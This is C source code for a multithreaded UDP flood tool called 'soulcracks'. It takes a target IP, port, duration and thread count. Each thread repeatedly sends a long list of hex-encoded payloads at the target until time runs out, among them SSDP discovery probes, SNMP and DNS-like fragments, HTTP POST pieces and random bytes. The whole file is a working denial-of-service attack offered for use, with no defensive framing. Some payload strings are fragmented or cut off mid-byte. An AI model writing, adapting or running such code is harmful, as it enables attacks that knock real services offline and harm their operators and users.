#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./soulcracks ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x61\xB1\x3C\x40\x6C\x8A\x86\x55\xE6\xB2\x02\x86\xC6\x61\xB1\x25\x89\x93\xDC\xB0\xB0\xB0\x9E\x37\x6A\x2A\x17\xAA\x5D\xE4\xAF\x00\x07\x0A\x3F\xDB\xF6\xBC\xC0\x7A\xE8\xBD\x78\xE2\x60\xCE\xBC\x6C\xF6\x27\xCB\x4A\xBD\xF2\xEE\x6C\x64\x03\x77\x11\x8C",
        "\x61\xB1\x3C\x40\xC8\x8D\x86\x55\xE6\xB2\x02\x86\xC6\x61\x8D\x25\x89\x8C\xDC\xC0\xB0\xB0\xDE\x3A\x1E\x23\x63\x8C\x02\x0F\x1C",
        "\x63\x01\xB4\xAC\xEC\x89\x19\xD5\xC9\x2D\x5D\xE8\x7A\x14\x1F\xBF\xE6\x08\xCD\xBA\x92\xB0\x99\x3E\x32\x85\xD6\xAA\x5D\x9C\x17\x57\x73\xE3\x9D\x1B\x7F\x24\x88\xC3\xEB\x0B\xED\x60\x9F\x21\x43\xED\xE6\x48\xC5\x12\xBC\x92\x0B\x2F\xEA\x51\x5E\x1B\xE4\x48\xB1\x89\x01\x3D\x01\x61\xFA\xF9\x37\x8C\xFA\xAC\x1A\xCA\xD2\xAA\x9A\x66\x0E\x3A\x84\xAE\xC0\x17\xC7\xF9\x65\x85\x31\x51\x33\x9C\xDF\x87\x0C\xF6\x9C\x42\x46\xBE\xE7\x34\xCD\x9C\xEE\x8A\x2A\xFD\x64\xCB\x10\x63\x9D\xEF\x48\x9E\xA4\x12\xE7\xA4\x70\xFC\xA7\x93\xEA\x62\x4E\x86\x98\xDF\xCE\xB8\xA8\xBB\x33\x52\xD2\x80\x1D\x46\x1A\xCF\x78\xE8\x06\xB8\x84\xB9\x46\xE9\x6B\x48\xE3\x93\xC3\xD5\x31\x05\xC7\x6F\x92\x72\xB5\xFA\x06\x74\xAE\x36\xED\xCA\x9C\x2F\xA6\xF8\xF9\xD6\xCD\x14\xD5\x75\x1A\xF5\x4D\xF9\x9C\x55\x88\x8E\xEE\xCA\x47\x28\xD7\xE4\xC9\xC5\xBF\x1B\xEA\x1F\xEC\xEC\xF7\xC6\x31\x43\x0E\xE2\xA5\x20\x46\x3B\x68\xC3\x75\x75\x86\xB1\x08\x7B\xCC\xF2\x6E\xA4\xFF\x01\xF1\x21\x57\xCD\x2B\x03\x5B\xF5\x26\x67\x85\x41\x55\xB4\xF8\xE0\x63\xD3\x26\xA4\x1A\x08\xFE\x66\xC3\xBB\xAB\xBB\xB7\xCE\x04\xE0\x01\x74\x0E\x36\x85\xB5\x4D\x41\xE2\x90\xBE\x6C\x09\xA0\xB4\x75\x1A\xFF\x73\x54\xB0\xB6\x48\x05\x3E\x12\x4F\xC5\xB1\x14\x1A\xFF\xC3\x77\xB4\x9F\x07\x8C\xFD\xA6\xBB\x74\x55\xC8\x09\xE9\x33\xF7\xEB\x17\x47\xDE\x9A\xAB\x91\xC3\xCF\x4D\x00\xF2\xD3\x96\xB9\xEB\x19\xAB\x5A\x64\x55\x0C\xCD\x7B\xBA\xAF\xA9\x1E\x33\x5E\x41\x39\x35\x8E\x07\xF1\x5B\xE6\xE5\xD7\xD2\x4D\xCC\x2D\x69\x6A\x7F\xED\x26\x2F\x3E\xA1\xE4\xE8\xD5\x00\x33\xE0\xFA\x58\xFD\xE9\x5B\x0F\x70\x13\x52\x04\x26\x7C\xFD\x9C\x1C\x51\xA0\xAB\xC8\x3C\x17\x4A\x16\x81\x60\xD7\x1F\x41\x22\x79\xF1\xD2\x9B\x73\x26\x41\x2E\x1C\x07\xD8\xE5\x30\xAB\xAC\x80\xF2\xE7\xAF\xF1\x3A\x77\x61\x21\x19\xCA\x77\x52\xE2\x74\xFC\x00\xE7\x8E\x0C\x79\x6C\xF2\xC6\x03\x67\xF5\xDA\x9C\x16\x57\x4C\x40\x69\x65\xF2\x1E\xEF\x58\x63\xEB\x9B\x46\xB8\xE5\xD6\xCA\x49\x6C\xF7\xB6\x73\x55\x5A\xAF\x06\x91\x17\xE1\x9B\x6D\xB1\x77\x3D\x8E\x2",
        "\x4B\x01\xCC\xAC\xBC\x5B\xF2\x57\x1C\x46\xD2\x21\x21\x5D\x24\x1E\xFC\x20\xFC\x95\x36\xE1\xD4\xAC\xB0\x8A\xD6\xAB\x1D\xB3\x63\x72\xE7\x62\x31\xCC\x4F\x02\x07\x4D\x8B\xA3\x48\xFF\x3E\xF8\xC1\xEF\x8A\xB4\x28\x0C\x99\x90\x5B\x2D\x4A\x2E\xB3\x13\xF4\xCB\x5F\x50\x9C\x5B\x26\x33\xF6\xB5\xDE\xEA\x1B\xFC\x69\x18\xD5\x0B\xDC\xE8\x98\xC9\x7B\xAD\x74\x85\xC4\x99",
        "\x9F\x01\xCC\xAC\xBC\x5A\xF2\x57\x1C\x46\xD2\x21\xA8\x51\x64\x18\x34\xF2\x3E\xB8\x96\x88\x49\x96\x14\xCA\x69\xA2\x96\xED\xD1\xA4\xE0\x05\xE4\x18\xFF\x3A\x80\x05\x9B\x3D\x4D\x99\xD2\x8A\x90\x17\x83\x7C\x24\x35\xA8\x10\xDA\x81\xB2\x23\x04\x0E\xBE\x4B\xEF\xF7\xBD\x47\x60\x6E\xBA\xF2\x1F\xEC\x9B\x5E\x03\x82\x09\x82\x9B\x65\xD7\x9D\x4F\xD3\xAC\x65\x86\xBB\x75\x45\xC1\x09\x3E\x34\x01\x1B\x7D\xA0\x9C\xB3\xBD\x81\x05\x85\xD9\xFB\xD8\x87\xDA\x19\x95\xDC\x70\x5D\xE3\xEA\x60\x39\xCF\x47\x64\xED\x5F\x1D\x9E\xAF\x92\x2B\x04\xEC\x80\xD2\x4E\xB9", 
        "\x50\x4F\x53\x54\x20\x2F\x48\x54\x54\x50\x2F\x31\x2E\x31\x0D\x0A\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x4C\x65\x6E\x67\x74\x68\x3A\x20",
        "\x31\x32\x0D\x0A\x44\x61\x74\x61\x2D\x54\x79\x70\x65\x3A\x20\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x66\x6F\x72\x6D\x2D\x64\x61\x74\x65\x3B\x20\x63\x68\x61\x72\x73\x3A\x20\x31\x32\x0D",
        "\x0A\x46\x6F\x72\x6D\x2D\x44\x61\x74\x61\x3A\x20\x61\x62\x63\x64\x65\x66\x67\x0D\x0A\x0D\x0A\x61\x3D\x62\x3C\x64\x66\x3D\x67\x33\x6C",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x50\x4F\x53\x54\x20\x2F\x48\x54\x54\x50\x2F\x31\x2E\x31\x0D\x0A\x00\x00",
        "\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x4C\x65\x6E\x67\x74\x68\x3A\x20\x00\x00",
        "\x31\x32\x0D\x0A\x44\x61\x74\x61\x2D\x54\x79\x70\x65\x3A\x20\x61\x00\x00",
        "\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x66\x6F\x72\x6D\x2D\x00\x00",
        "\x64\x61\x74\x65\x3B\x20\x63\x68\x61\x72\x73\x3A\x20\x31\x32\x0D\x00\x00",
        "\x0A\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67\x00\x00",
        "\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x62\x69\x6e\x67\x2e\x63\x6f\x6d\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x73\x65\x61\x72\x63\x68\x2e\x62\x72\x61\x76\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x48\x4f\x53\x54\x3a\x20\x32\x34\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
        "\x79\x61\x68\x6f\x6f\x2e\x63\x6f\x6d\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x48\x4f\x53\x54\x3a\x20\x32\x33\x37\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
        "\x64\x75\x63\x6b\x64\x75\x63\x6b\x67\x6f\x2e\x63\x6f\x6d\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x48\x4f\x53\x54\x3a\x20\x32\x31\x30\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
        "\x3A\x20\x67\x7A\x69\x70\x2C\x20\x64\x65\x66\x6C\x61\x74\x65\x2C\x00\x00",
        "\x20\x62\x72\x6F\x77\x73\x65\x0D\x0A\x55\x73\x65\x72\x2D\x41\x67\x00\x00",
        "\x65\x6E\x74\x3A\x20\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x00\x00",
        "\x20\x28\x4C\x69\x6E\x75\x78\x20\x53\x58\x29\x0D\x0A\x43\x68\x61\x00\x00",
        "\x72\x73\x2D\x43\x6F\x6D\x70\x72\x65\x73\x73\x69\x6F\x6E\x2D\x49\x00\x00",
        "\x61\xB1\x3C\x40\x6C\x8A\x86\x55\xE6\xB2\x02\x86\xC6\x61\xB1\x25\x89\x93\xDC\xB0\xB0\xB0\x9E\x37\x6A\x2A\x17\xAA\x5D\xE4\xAF\x00",
        "\x07\x0A\x3F\xDB\xF6\xBC\xC0\x7A\xE8\xBD\x78\xE2\x60\xCE\xBC\x6C\xF6\x27\xCB\x4A\xBD\xF2\xEE\x6C\x64\x03\x77\x11\x8C\x00\x00",
        "\x61\xB1\x3C\x40\xC8\x8D\x86\x55\xE6\xB2\x02\x86\xC6\x61\x8D\x25\x89\x8C\xDC\xC0\xB0\xB0\xDE\x3A\x1E\x23\x63\x8C\x02\x0F\x1C\x00\x00",
        "\x63\x01\xB4\xAC\xEC\x89\x19\xD5\xC9\x2D\x5D\xE8\x7A\x14\x1F\xBF\xE6\x08\xCD\xBA\x92\xB0\x99\x3E\x32\x85\xD6\xAA\x5D\x9C\x17\x57\x73\xE3\x9D\x1B\x7F\x00\x00",
        "\x24\x88\xC3\xEB\x0B\xED\x60\x9F\x21\x43\xED\xE6\x48\xC5\x12\xBC\x92\x0B\x2F\xEA\x51\x5E\x1B\xE4\x48\xB1\x89\x01\x3D\x01\x61\xFA\xF9\x37\x8C\xFA\xAC\x1A\xCA\xD2\xAA\x9A\x66\x0E\x3A\x84\xAE\xC0\x17\xC7\xF9\x65\x00\x00",
        "\x4B\x01\xCC\xAC\xBC\x5B\xF2\x57\x1C\x46\xD2\x21\x21\x5D\x24\x1E\xFC\x20\xFC\x95\x36\xE1\xD4\xAC\xB0\x8A\xD6\xAB\x1D\xB3\x63\x72\xE7\x62\x31\xCC\x4F\x02\x07\x4D\x8B\xA3\x48\xFF\x3E\xF8\xC1\xEF\x8A\xB4\x28\x0C\x99\x90\x5B\x2D\x00\x00",
        "\x4A\x2E\xB3\x13\xF4\xCB\x5F\x50\x9C\x5B\x26\x33\xF6\xB5\xDE\xEA\x1B\xFC\x69\x18\xD5\x0B\xDC\xE8\x98\xC9\x7B\xAD\x74\x85\xC4\x99\x00\x00",
        "\x9F\x01\xCC\xAC\xBC\x5A\xF2\x57\x1C\x46\xD2\x21\xA8\x51\x64\x18\x34\xF2\x3E\xB8\x96\x88\x49\x96\x14\xCA\x69\xA2\x96\xED\xD1\xA4\xE0\x05\xE4\x18\xFF\x3A\x80\x05\x9B\x3D\x4D\x99\x00\x00",
        "\xD2\x8A\x90\x17\x83\x7C\x24\x35\xA8\x10\xDA\x81\xB2\x23\x04\x0E\xBE\x4B\xEF\xF7\xBD\x47\x60\x6E\xBA\xF2\x1F\xEC\x9B\x5E\x03\x82\x09\x82\x9B\x65\xD7\x9D\x4F\xD3\xAC\x65\x86\xBB\x75\x00\x00",
        "\x64\x3A\x20\x61\x62\x63\x64\x65\x66\x67\x68\x69\x0D\x0A\x0D\x0A\x00\x00",
        "\x7B\x22\x6E\x61\x6D\x65\x22\x3A\x20\x22\x66\x69\x65\x6C\x64\x33\x00\x00",
        "\x00\x00\x00\x00\x00\x00\x00\x00",
        "\xff\xff\xff\xff\xff\xff\xff\xff",
        "\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a",
        "\xff\xff\x00\x00\xaa\xbb\xcc\xdd",
        "\x22\x2C\x20\x22\x72\x65\x61\x73\x6F\x6E\x22\x3A\x20\x22\x76\x61\x00\x00",
        "\x6C\x75\x65\x22\x2C\x20\x22\x6E\x61\x6D\x65\x73\x22\x3A\x20\x5B\x00\x00",
        "\x22\x63\x6F\x64\x65\x22\x2C\x20\x22\x64\x61\x74\x61\x22\x5D\x7D\x00\x00",
        "\x66\x72\x65\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x72\x65\x70\x61\x69\x72\x2e\x63\x6f\x6d\x00\x00",
        "\x77\x77\x77\x2e\x63\x6f\x6d\x00\x00",
        "\x73\x65\x61\x72\x63\x68\x2e\x63\x6f\x6d\x00\x00",
        "\x66\x72\x65\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x70\x61\x79\x70\x61\x79\x2e\x63\x6f\x6d\x00\x00",
        "\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x73\x65\x61\x72\x63\x68\x2e\x63\x6f\x6d\x00\x00",
        "\x72\x65\x67\x69\x73\x74\x72\x61\x74\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x74\x72\x61\x6e\x73\x66\x65\x72\x2e\x63\x6f\x6d\x00\x00",
        "\x72\x65\x67\x69\x73\x74\x72\x61\x74\x65\x2e\x63\x6f\x6d\x00\x00",
        "\x68\x74\x74\x70\x3a\x2f\x2f\x61\x64\x64\x72\x65\x73\x73\x65\x73\x2e\x63\x6f\x6d\x00\x00",
        "\x6e\x65\x74\x2e\x63\x6f\x6d\x00\x00",
        "\x64\x75\x63\x6b\x64\x75\x63\x6b\x67\x6f\x2e\x63\x6f\x6d\x00\x00",
 
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished");
    return 0;
}
